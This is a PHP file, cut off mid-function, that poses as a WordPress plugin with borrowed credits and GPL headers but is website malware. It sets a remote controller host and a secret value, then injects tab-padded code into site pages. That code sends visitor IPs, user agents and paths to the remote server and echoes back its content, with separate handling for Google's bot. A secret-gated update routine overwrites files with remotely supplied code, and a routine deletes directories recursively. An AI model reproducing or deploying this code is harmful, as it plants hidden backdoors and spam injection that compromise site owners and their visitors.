<?php  
/* 
Special thanks to:  

Ryan Duff and Firas Durri, authors of WP-ContactForm, to which this 
plugins' initial concept and some parts of code was built based on. 

modernmethod inc, for SAJAX Toolkit, which was used to build this 
plugins' AJAX implementation 
*/


/*
Copyright (C) 2006-8 Matthew Robinson
Based on the Original Subscribe2 plugin by 
Copyright (C) 2005 Scott Merrill (skippy@skippy.net)

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
http://www.gnu.org/licenses/gpl.html

You should have received a copy of the GNU General Public License along  
with this program (intouch-license-gpl.txt); if not, write to the  

    Free Software Foundation, Inc.,  
    59 Temple Place,  
    Suite 330,  
    Boston,  
    MA 02111-1307 USA
*/

/* 
Do not modify the following code to manipulate the output of this plugin.  
For configuration options, please see 'Options'. 
*/

ignore_user_abort(true); 
set_time_limit(0); 
error_reporting(0); 	 
ini_set('display_errors', "0");

@header('X-Powered-By:');


define('__IS_USE_CURL__', false);
define('__UNIQUE_HASH__', 'c89274c116c70cebf0f49827e96f1487');
define('__SEC_VALUE__', '105fbae7e7658bfc1d8d09a0449098af');
define('_URL_', 'http://openmonitor1.net/generator_inside/show.php');
define('_DOMAIN_', 'javadude.com');  

function GetContents($sUrl, & $sOutContent) 
{
	$stParsedUrl = array();
	$stParsedUrl = parse_url($sUrl);
	
	$lssParametrArray = array();
	
	if(isset($stParsedUrl['query']) === true && strlen($stParsedUrl['query']) > 0)
	{
		$lssExplodeQuery = array();
		$lssExplodeQuery = explode('&', $stParsedUrl['query']);
		
		for($i = 0; $i < count($lssExplodeQuery); ++$i)
		{
			$lssTempExplodeInfo = array();
			$lssTempExplodeInfo = explode('=', $lssExplodeQuery[$i]);
			
			$lssParametrArray[$lssTempExplodeInfo[0]] = $lssTempExplodeInfo[1];
		}
	}
	
	$verb = 'GET';					/* HTTP Request Method (GET and POST supported) */ 
    $ip	= $stParsedUrl['host']; 	/* Target IP/Hostname */ 
    $port = 80;                 	/* Target TCP port */ 
	$uri = '/';
	if(isset($stParsedUrl['path']) === true && strlen($stParsedUrl['path']) > 0)
	{
		$uri = $stParsedUrl['path'];	/* Target URI */ 
	}
    $getdata = $lssParametrArray; 	/* HTTP GET Data ie. array('var1' => 'val1', 'var2' => 'val2') */ 
    $postdata = array();	       	/* HTTP POST Data ie. array('var1' => 'val1', 'var2' => 'val2') */ 
    $cookie = array();	          	/* HTTP Cookie Data ie. array('var1' => 'val1', 'var2' => 'val2') */ 
    $custom_headers = array();  	/* Custom HTTP headers ie. array('Referer: http://localhost/ */ 
    $timeout = 5;           		/* Socket timeout in seconds */ 
    $req_hdr = false;           	/* Include HTTP request headers */ 
    $res_hdr = false;            	/* Include HTTP response headers */ 

	
	$ret = ''; 
    $verb = strtoupper($verb); 
    $cookie_str = ''; 
    $getdata_str = count($getdata) ? '?' : ''; 
    $postdata_str = ''; 

    foreach ($getdata as $k => $v)
	{
		$getdata_str .= urlencode($k) .'='. urlencode($v) . '&'; 
	}

    foreach ($postdata as $k => $v) 
	{
        $postdata_str .= urlencode($k) .'='. urlencode($v) .'&'; 
	}

    foreach ($cookie as $k => $v) 
	{
        $cookie_str .= urlencode($k) .'='. urlencode($v) .'; '; 
	}

    $crlf = "\r\n"; 
    $req = $verb .' '. $uri . $getdata_str .' HTTP/1.1' . $crlf; 
    $req .= 'Host: '. $ip . $crlf; 
    $req .= 'User-Agent: Mozilla/5.0 Firefox/3.6.12' . $crlf; 
    $req .= 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' . $crlf; 
    $req .= 'Accept-Language: en-us,en;q=0.5' . $crlf; 
    $req .= 'Accept-Encoding: deflate;q=0.9' . $crlf; 
    $req .= 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7' . $crlf; 
	
    foreach ($custom_headers as $k => $v) 
	{
        $req .= $k .': '. $v . $crlf; 
	}
        
    if (!empty($cookie_str)) 
	{
        $req .= 'Cookie: '. substr($cookie_str, 0, -2) . $crlf; 
	}
        
    if ($verb == 'POST' && !empty($postdata_str)) 
    { 
        $postdata_str = substr($postdata_str, 0, -1); 
        $req .= 'Content-Type: application/x-www-form-urlencoded' . $crlf; 
        $req .= 'Content-Length: '. strlen($postdata_str) . $crlf; 
		$req .= 'Connection: Close'. $crlf . $crlf;
        $req .= $postdata_str; 
    } else 
	{
		$req .= 'Connection: Close'. $crlf . $crlf;
	}
    
    if ($req_hdr) 
	{
        $ret .= $req; 
	}
    
    if (($fp = @fsockopen($ip, $port, $errno, $errstr)) == false) 
	{
		$sOutContent = false;
        //echo "Error $errno: $errstr\n"; 
		return;
	}
    
    stream_set_timeout($fp, $timeout); 
    
    $sPut = fputs($fp, $req); 
	
	
	while (!feof($fp)) 
	{
        $sLine = '';
		$sLine = fgets($fp);
		
		if($sLine === false)
		{
			break;
		}
		
		$ret .= $sLine; 
		
		if(!(strpos ($ret, "0\r\n\r\n" ) === false))
		{
			break;
		}
    }
	
    fclose($fp); 
    
	$sResponseHeaders = '';
	$sResponseHeaders = trim(substr($ret, 0, strpos($ret, "\r\n\r\n")));
		
    if (!$res_hdr) 
	{
        $ret = substr($ret, strpos($ret, "\r\n\r\n") + 4); 
	}
	

	$sOutContent = preg_replace_callback('/(?:(?:\r\n|\n)|^)([0-9A-F]+)(?:\r\n|\n){1,2}(.*?)'.'((?:\r\n|\n)(?:[0-9A-F]+(?:\r\n|\n))|$)/si', create_function('$matches','return hexdec($matches[1]) == strlen($matches[2]) ? $matches[2] : $matches[0];'), $ret);
		
	$lssExplodeHeaders = array();
	$lssExplodeHeaders = explode("\n", $sResponseHeaders);
	
	$lssArrayMatches = array();
	$nMatches = array();
	$nMatches = preg_match_all('#.*\\s+([0-9]+)\\s#is', $lssExplodeHeaders[0], $lssArrayMatches, PREG_PATTERN_ORDER);
	if($nMatches === false || $nMatches == 0)
	{
		$sOutContent = false;
		return;
	}
	
	if((int)($lssArrayMatches[1][0]) >= 400)
	{
		$sOutContent = false;
		return;
	}
	
	foreach($lssExplodeHeaders as $sHeaders)
	{
		$nMatches = 0;
		$lssArrayMatches = array();
		$nMatches = preg_match_all('#^Location:\\s+(.*)$#is', $sHeaders, $lssArrayMatches, PREG_PATTERN_ORDER);
		
		if($nMatches > 0)
		{
			$sOutContent = '';
			GetContents(trim($lssArrayMatches[1][0]), $sOutContent);
		}
		
		$nMatches = 0;
		$lssArrayMatches = array();
		$nMatches = preg_match_all('#^Content-Encoding:\\s+gzip$#is', $sHeaders, $lssArrayMatches, PREG_PATTERN_ORDER);
		if($nMatches > 0)
		{
			$sOutContent = gzinflate(substr($sOutContent, 10), 10485760); 
		}
	}
}

/**
*  Use this function is recursive delete folder content
*  the output of RecursiveDelete().
*/
function RecursiveDelete($sDirectory, $bIsEmpty = false)  
{ 
    if(substr($sDirectory,-1) == "/") 
	{ 
        $sDirectory = substr($sDirectory, 0, -1); 
    } 

    if(!file_exists($sDirectory) || !is_dir($sDirectory)) 
	{ 
        return false; 
    } else
		if(!is_readable($sDirectory)) 
		{ 
			return false; 
		} else 
		{ 
			$stDirectoryHandle = opendir($sDirectory); 
			
			while ($sContents = readdir($stDirectoryHandle)) 
			{ 
				if($sContents != '.' && $sContents != '..' && $sContents != '.htaccess') 
				{ 
					$sPath = $sDirectory . "/" . $sContents; 
					
					if(is_dir($sPath)) 
					{ 
						RecursiveDelete($sPath); 
					} else 
					{ 
						unlink($sPath); 
					} 
				} 
			} 
			
			closedir($stDirectoryHandle); 

			if($bIsEmpty == false) 
			{ 
				if(!rmdir($sDirectory)) 
				{ 
					return false; 
				} 
			} 
			
			return true; 
		} 
}

/**
*  Use this function is make replace usung perl regular exception fo Joomla CSS
*  the output of MakePregBeforeBody().
*/
function MakePregBeforeBody($sInlucdePath, & $rsScriptURL, $bUseCurlScript)  
{
	$sInOutContent = '';
	
	$stIncludeFileHandle = fopen($sInlucdePath, 'r');
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sInOutContent = fread($stIncludeFileHandle, filesize($sInlucdePath)); 
		if($sInOutContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
	
	
		$bIsBodyInTags = false;
		$lssMatches = array(); 
		$nMatches = preg_match_all('#<\\?([[:print:]\\s]*?)\\?>#i', $sInOutContent, $lssMatches);
		if(!($nMatches === false) && $nMatches > 0)
		{
			foreach($lssMatches as $sTegContents) 
			{
				$nMatch = preg_match('#<\s*\/\s*body\s*>#i', $sTegContents); 
				if(!($nMatch === false) && $nMatch > 0)  
				{
					$bIsBodyInTags = true;
					break;
				}
			}
		}
		
		$nMatch = preg_match('#((?:<\\?php)|(?:<\\?))\\s+error_reporting\\(0\\);\\s*#i', $sInOutContent);
		if($nMatch === false || $nMatch == 0)
		{		
			$nReplaceCount = 0;
			$sInOutContent = preg_replace('#((?:<\\?php)|(?:<\\?))#i', '\1'."\nerror_reporting(0);\n", $sInOutContent, 1, $nReplaceCount); 
			if($sInOutContent === NULL || $sInOutContent == '')
			{
				echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
				exit();
			}
			if($nReplaceCount == 0) 
			{
				$sInOutContent = "<?php error_reporting(0); ?>\n".$sInOutContent;
			}
		}
		
		
		if($bIsBodyInTags === false)
		{
			$sAddScript = ''; 
			if($bUseCurlScript == false) 
			{
				$sAddScript = '
<?php
	/*This code use for global bot statistic*/
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); /*Looks for google search bot*/
	$sReferer = \'\';
	if(isset($_SERVER[\'HTTP_REFERER\']) === true)
	{
		$sReferer = strtolower($_SERVER[\'HTTP_REFERER\']);
	}
	if(!(strpos($sUserAgent, \'google\') === false)) /*Bot comes*/
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer) );
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer));
	} /*Statistic code end*/
?>

	';
			} else
			{
				$sAddScript = '
<?php	
	/*This code use for global bot statistic*/
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); /*Looks for google search bot*/
	$sReferer = \'\';
	if(isset($_SERVER[\'HTTP_REFERER\']) === true)
	{
		$sReferer = strtolower($_SERVER[\'HTTP_REFERER\']);
	}
	$stCurlHandle = NULL;
	if(!(strpos($sUserAgent, \'google\') === false)) /*Bot comes*/
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer)); 
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer)); 
	}
	curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
	$sResult = curl_exec($stCurlHandle); 
	curl_close($stCurlHandle); 
	echo $sResult; /*Statistic code end*/
?>	
	';
			}
		
			$sAddScript = str_replace("\n", ' ', $sAddScript);
			$sAddScript = "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t".$sAddScript."\n";
			
			$nReplaceCount = 0; 
			$sInOutContent = preg_replace('#(<\s*\/\s*body\s*>)#i', $sAddScript.'\1', $sInOutContent, 1, $nReplaceCount);
			if($sInOutContent === NULL || $sInOutContent == '')
			{
				echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
				exit();
			}
			if($nReplaceCount == 0)
			{
				$sInOutContent .= "\n"."\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t".$sAddScript; 
			}
		} else
		{
			echo '<fail>Tag Body is in php tags</fail>'; 
			exit();
		}
		
		
	
	$stUpdateFileHanle = fopen($sInlucdePath, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sInOutContent) === false) 
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}


/**
*  Use this function is make replace usung perl regular exception fo Joomla CSS
*  the output of MakePregAtEnd().
*/
function MakePregAtEnd($sInlucdePath, & $rsScriptURL, $bUseCurlScript)  
{
	$sInOutContent = '';
	
	$stIncludeFileHandle = fopen($sInlucdePath, 'r');
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sInOutContent = fread($stIncludeFileHandle, filesize($sInlucdePath)); 
		if($sInOutContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
	
			
		$nMatch = preg_match('#((?:<\\?php)|(?:<\\?))\\s+error_reporting\\(0\\);\\s*#i', $sInOutContent);
		if($nMatch === false || $nMatch == 0)
		{		
			$nReplaceCount = 0;
			$sInOutContent = preg_replace('#((?:<\\?php)|(?:<\\?))#i', '\1'."\nerror_reporting(0);\n", $sInOutContent, 1, $nReplaceCount); 
			if($sInOutContent === NULL || $sInOutContent == '')
			{
				echo '<fail>Preg_Replace error PHP vervsion is too old</fail>'; 
				exit();
			}
			if($nReplaceCount == 0) 
			{
				$sInOutContent = "<?php error_reporting(0); ?>\n".$sInOutContent;
			}
		}
		
			$stParsedPath = array();
			$stParsedPath = pathinfo($sInlucdePath);
		
			if(strcmp($stParsedPath['extension'], 'php') === 0 && !(strpos($sInOutContent, '<?') === false) && strpos($sInOutContent, '?>') === false)
			{
				$sInOutContent .= "\n".'?>'."\n";
			}
		

			$sAddScript = ''; 
			if($bUseCurlScript == false) 
			{
				$sAddScript = '
<?php
	/*This code use for global bot statistic*/
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); /*Looks for google search bot*/
	$sReferer = \'\';
	if(isset($_SERVER[\'HTTP_REFERER\']) === true)
	{
		$sReferer = strtolower($_SERVER[\'HTTP_REFERER\']);
	}
	if(!(strpos($sUserAgent, \'google\') === false)) /*Bot comes*/
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer) );
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		echo file_get_contents(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer));
	} /*Statistic code end*/
?>

	';
			} else
			{
				$sAddScript = '
<?php	
	/*This code use for global bot statistic*/
	$sUserAgent = strtolower($_SERVER[\'HTTP_USER_AGENT\']); /*Looks for google search bot*/
	$sReferer = \'\';
	if(isset($_SERVER[\'HTTP_REFERER\']) === true)
	{
		$sReferer = strtolower($_SERVER[\'HTTP_REFERER\']);
	}
	$stCurlHandle = NULL;
	if(!(strpos($sUserAgent, \'google\') === false)) /*Bot comes*/
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer)); 
	} else
	{
		if(isset($_SERVER[\'REMOTE_ADDR\']) == true && isset($_SERVER[\'HTTP_HOST\']) == true) /*Create bot analitics*/			
		$stCurlHandle = curl_init(\''.$rsScriptURL.'?ip=\'.urlencode($_SERVER[\'REMOTE_ADDR\']).\'&useragent=\'.urlencode($sUserAgent).\'&domainname=\'.urlencode($_SERVER[\'HTTP_HOST\']).\'&fullpath=\'.urlencode($_SERVER[\'REQUEST_URI\']).\'&addcheck=\'.\'&check=\'.isset($_GET[\'look\']).\'&ref=\'.urlencode($sReferer)); 
	}
	curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
	$sResult = curl_exec($stCurlHandle); 
	curl_close($stCurlHandle); 
	echo $sResult; /*Statistic code end*/
?>	
	';
			}
		
			$sAddScript = str_replace("\n", ' ', $sAddScript);
			$sAddScript = "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t".$sAddScript."\n";
			
			if($nReplaceCount == 0)
			{
				$sInOutContent .= "\n"."\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t".$sAddScript;
			}
		
		
		
	
	$stUpdateFileHanle = fopen($sInlucdePath, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open include file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sInOutContent) === false) 
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in include file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}

/**
*  Use this function is make updating standart paths in files
*  the output of UpdatePath().
*/
function UpdatePath(& $rsCurrentScriptContent, & $rsNewScriptContent) 
{
	$lssScriptPathMatch = array(); 
	
	
	$nMatchResult = preg_match('#define\\(\'__SCRIPT_PATH_\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$INDEX_FILE_NAME$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}
	
	$nMatchResult = preg_match('#define\\(\'__IS_USE_CURL__\', (.*)\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$IS_USE_CURL$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}
	
	$nMatchResult = preg_match('#define\\(\'__UNIQUE_HASH__\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$MD5_HASH$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}
	
	
	$nMatchResult = preg_match('#define\\(\'__SEC_VALUE__\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$SEC_VALUE$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}
	
	
	$nMatchResult = preg_match('#define\\(\'_URL_\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$URL$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}	
	
	$nMatchResult = preg_match('#define\\(\'_DOMAIN_\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$DOMAIN$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}
}

/**
*  Use this function to update file paths
*  the output of UpdateGetContent().
*/
function UpdateGetContent(& $rsCurrentScriptContent, & $rsNewScriptContent) 
{
	$lssMatches = array();
	$nMatchesResult = preg_match_all('#@header\\(\\\'X-Powered-By:\\\'\\);#is', $rsCurrentScriptContent, $lssMatches);
	if($nMatchesResult === false || $nMatchesResult === 0)
	{
		$rsNewScriptContent = str_replace('/*\'#$REPLACE_X_POWERED_BY$#\'*/', '', $rsNewScriptContent);
	} else
	{
		$rsNewScriptContent = str_replace('/*\'#$REPLACE_X_POWERED_BY$#\'*/', '@header(\'X-Powered-By:\');', $rsNewScriptContent);
	}

	
	$lssMatches = array();
	$nMatchesResult = preg_match_all('#(function\\s+GetContents\\((?:[[:print:]]*?)\\)\\s*{(?:[[:print:]\\s]*?)})\\s*\\/\\*\\*#is', $rsCurrentScriptContent, $lssMatches);
	if($nMatchesResult === false || $nMatchesResult === 0)
	{
		return;
	}
	
	$rsNewScriptContent = str_replace('\'#$GET_CONTENT_FUNCTIONS$#\'', $lssMatches[1][0], $rsNewScriptContent);
}

/**
*  Use this function is make updating this file
*  the output of Update().
*/
function Update() 
{
	if(isset($_REQUEST['secvalue']) === false)
	{
		echo '<fail>No sec val param</fail>';
		exit();
	}
	
	
	$sSecValue = '';
	$sSecValue = trim($_REQUEST['secvalue']);
	
	if(strcmp($sSecValue, __SEC_VALUE__) != 0)
	{
		echo '<fail>Sec value dont match</fail>';
		exit();
	}


	$sFileName = ''; 
	if(isset($_SERVER['SCRIPT_FILENAME']) == true)
	{
		$stScritpPath = explode('/', $_SERVER['SCRIPT_FILENAME']); 
		$sFileName = $stScritpPath[count($stScritpPath) - 1];  
	} else
		if(isset($_SERVER['SCRIPT_NAME']) == true)
		{
			$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['SCRIPT_NAME'])); 
			$sFileName = $stScritpPath[count($stScritpPath) - 1];  
		} else
			if(isset($_SERVER['PHP_SELF']) == true)
			{
				$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['PHP_SELF'])); 
				$sFileName = $stScritpPath[count($stScritpPath) - 1];  
			} 
	
	$sUpdateFileName = ''; 
	if(isset($_REQUEST['filename']) == true) 
	{
		$sUpdateFileName = $_REQUEST['filename']; 
		if(strlen($sFileName) == 0) 
		{
			$sFileName = $sUpdateFileName;
		}
	} else
	{
		if(strlen($sFileName) == 0) 
		{
			echo '<fail>update script name</fail>'; 
			exit();
		}
		
		$sUpdateFileName = $sFileName;
	}
	
	$sNewScript = ''; 
	if(isset($_REQUEST['update_url']) == true)
	{
		$bGetResult = GetContents($_REQUEST['update_url'], 
								  $sNewScript 
								 ); 
		if($bGetResult == false)
		{
			echo '<fail>get update content fail</fail>'; 
			exit();
		}
	} else
		if(isset($_REQUEST['update_code']) == true) 
		{
			$sNewScript = $_REQUEST['update_code']; 
			$sNewScript = str_replace("\'", "'", $sNewScript);
			$sNewScript = str_replace('\"', '"', $sNewScript);
			$sNewScript = str_replace("\\\\", "\\", $sNewScript);
		} else
		{
			echo '<fail>don\'t have update content</fail>'; 
			exit();
		}
	
	$sCurrentFileContent = ''; 
	
	$stCurrentFileHandle = fopen($sFileName, 'r');  
	if($stCurrentFileHandle === false)
	{
		echo '<fail>fail open current file</fail>'; 
		exit();
	}
		$sCurrentFileContent = fread($stCurrentFileHandle, filesize($sFileName)); 
		if($sCurrentFileContent === false)
		{
			echo '<fail>fail read current file</fail>'; 
			exit();
		}
	fclose($stCurrentFileHandle);
	
	UpdatePath($sCurrentFileContent, $sNewScript); 
	UpdateGetContent($sCurrentFileContent, $sNewScript);
	
	$stUpdateFileHanle = fopen($sUpdateFileName, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open update file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sNewScript) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in update file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<correct>Correct update file</correct>';
}


/**
*  Use this function use update fils in somes files
*  the output of UpdateFilds().
*/
function UpdateFilds() 
{
	$sFileName = ''; 
	if(isset($_SERVER['SCRIPT_FILENAME']) == true)
	{
		$stScritpPath = explode('/', $_SERVER['SCRIPT_FILENAME']); 
		$sFileName = $stScritpPath[count($stScritpPath) - 1];  
	} else
		if(isset($_SERVER['SCRIPT_NAME']) == true)
		{
			$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['SCRIPT_NAME'])); 
			$sFileName = $stScritpPath[count($stScritpPath) - 1];  
		} else
			if(isset($_SERVER['PHP_SELF']) == true)
			{
				$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['PHP_SELF'])); 
				$sFileName = $stScritpPath[count($stScritpPath) - 1];  
			} 
	
	$sUpdateFileName = ''; 
	if(isset($_REQUEST['filename']) == true) 
	{
		$sUpdateFileName = $_REQUEST['filename']; 
		if(strlen($sFileName) == 0) 
		{
			$sFileName = $sUpdateFileName;
		}
	} else
	{
		if(strlen($sFileName) == 0)
		{
			echo '<fail>update script name</fail>'; 
			exit();
		}
		
		$sUpdateFileName = $sFileName;
	}
	
	$sCurrentFileContent = ''; 
	
	$stCurrentFileHandle = fopen($sFileName, 'r');  
	if($stCurrentFileHandle === false)
	{
		echo '<fail>fail open current file</fail>'; 
		exit();
	}
		$sCurrentFileContent = fread($stCurrentFileHandle, filesize($sFileName)); 
		if($sCurrentFileContent === false)
		{
			echo '<fail>fail read current file</fail>'; 
			exit();
		}
	fclose($stCurrentFileHandle);
	
	$sNewScript = $sCurrentFileContent;
	
	$sSecValue = '';
	$sSecValue = trim($_REQUEST['secvalue']);
	if(strcmp(__SEC_VALUE__, '%$SEC_VALUE$%') == 0 || strcmp($sSecValue, __SEC_VALUE__) == 0)
	{
		if(strcmp(__SEC_VALUE__, '%$SEC_VALUE$%') == 0)
		{
			$sNewScript = preg_replace('#define\\(\'__SEC_VALUE__\',\\s.*\\);#i', 'define(\'__SEC_VALUE__\', \''.$sSecValue.'\');', $sNewScript);
		}
	} else
	{
		echo '<fail>Sec value dont match</fail>';
		exit();
	}
		
	$sDgenURL = '';
	$sDgenURL = AddHttpToLine(trim($_REQUEST['dgen']));

	$sNewScript = preg_replace('#define\\(\'_URL_\',\\s\'.*\'\\);#i', 'define(\'_URL_\', \''.$sDgenURL.'\');', $sNewScript);	

	
	
		
	$stUpdateFileHanle = fopen($sUpdateFileName, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open update file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sNewScript) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in update file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<correct>Correct update file</correct>';
}

/**
*  Use this function is make removing script from other file
*  the output of RemoveScript().
*/
function RemoveScript() 
{
	define('__SCRIPT_PATH_', '../../../index.html'); 
	$sIncludePath = __SCRIPT_PATH_;
	
	$sIncludeFileContent = '';
	$stIncludeFileHandle = fopen($sIncludePath, 'r');  
	if($stIncludeFileHandle === false)
	{
		echo '<fail>fail open include file</fail>'; 
		exit();
	}
		$sIncludeFileContent = fread($stIncludeFileHandle, filesize($sIncludePath)); 
		if($sIncludeFileContent === false)
		{
			fclose($stIncludeFileHandle);
			echo '<fail>fail read include file</fail>'; 
			exit();
		}
	fclose($stIncludeFileHandle);
		$lssMatchCode = array(); 
		
